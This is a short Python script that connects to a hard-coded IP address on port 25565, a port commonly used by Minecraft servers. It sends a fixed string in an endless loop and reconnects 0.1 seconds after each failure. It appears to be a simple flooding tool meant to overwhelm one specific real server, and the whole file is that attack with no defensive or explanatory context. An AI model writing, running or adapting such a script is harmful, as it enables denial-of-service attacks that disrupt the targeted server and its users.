import socket
import time

i = 0

def create_connection():
    client = socket.socket()
    hostname = '85.192.30.142'
    port = 25565
    try:
        client.connect((hostname, port))
        print('Successful connection to the server')
        return client
    except Exception as e:
        print(f'Connection error: {e}')
        return None

def send_requests(client):
    global i
    while True:
        try:
            client.send(message.encode())
            i += 1
            print(f'Request {i} send')
        except Exception as e:
            print(f'Send error: {e}')
            return False

message = '65918679f752cb599467992901abbdae'

while True:
    client = create_connection()
    if client:
        if not send_requests(client):
            client.close()
            print('Try to reconnect after 0.1 second...')
            time.sleep(0.1)
    else:
        print('Try to reconnect after 0.1 second...')
        time.sleep(0.1)
